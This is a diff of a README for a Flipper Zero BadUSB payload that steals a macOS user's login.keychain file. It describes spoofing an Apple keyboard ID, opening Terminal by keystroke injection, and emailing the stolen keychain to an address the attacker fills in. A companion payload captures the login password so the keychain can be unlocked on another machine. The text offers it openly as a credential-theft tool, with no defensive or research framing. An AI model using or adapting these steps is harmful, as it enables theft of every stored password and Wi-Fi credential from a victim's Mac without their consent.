@@ -1,12 +1,12 @@
 # FULL macOS Passwords Grabber
 
 Here is a macOS payload that will grab a file named `login.keychain` that's the file where all macOS's passwords are stored (Applications, Wifi and so on..).
-Using <strong><ins>@birkhoffcheng's</ins></strong> `sudo_password_grabber` you will be able to find the login password needed to unlock the `login.keychain` file and then read ALL the credentials you will need, once opening the "Keychain Access" application and importing the `login.keychain` file, on another macOS machine. 
+Using my other payload `sudo_credentials_stealer` you will be able to find the login password needed to unlock the `login.keychain` file and then read ALL the credentials you will need, once opening the "Keychain Access" application and importing the `login.keychain` file, on another macOS machine. 
 
 
 ### Instructions
 
-> PRE: Lets extract the Login password of the current user, using the @birkhoffcheng's sudo_password_grabber payload that you can find into this repo.
+> PRE: Lets extract the Login password of the current user, using my other payload `sudo_credentials_stealer` that you can find into this repo.
 
 1. First of all with the ID 05ac:021e Apple:Keyboard line, we are telling to the computer that our Flipper is a "real Apple keyboard" to avoid macOS is displaying the "Keyboard Setup Assistant" dialog and your script is going fuck itself.
 2. Press the GUI key and the SPACE key to open the Spotlight search on macOS. Now we type "terminal" to search for the terminal application and press ENTER to open it.
@@ -18,7 +18,7 @@ Using <strong><ins>@birkhoffcheng's</ins></strong> `sudo_password_grabber` you w
 
 ### Usage
 FIRST OF ALL DO THE "PRE" ACTION USCING THE OTHER BAD USB ATTACK SUBMODULED IN THIS REPO.   
-Replace in `keychain_grabber.txt` example@example.com with the mail you want to use to recive the logs.
+Replace in `keychain_grabber.txt` example@example.com with the mail you want to use to recive the logs. (Also in th `sudo_credentials_stealer` file).
 Power on your Flipper Zero, and navigate to badusb/full_password_grabber (or where you uploaded the payload) and click on it.
 Wait until on your Flipper you are reading 100%.
 Disconnects Flipper Zero.  
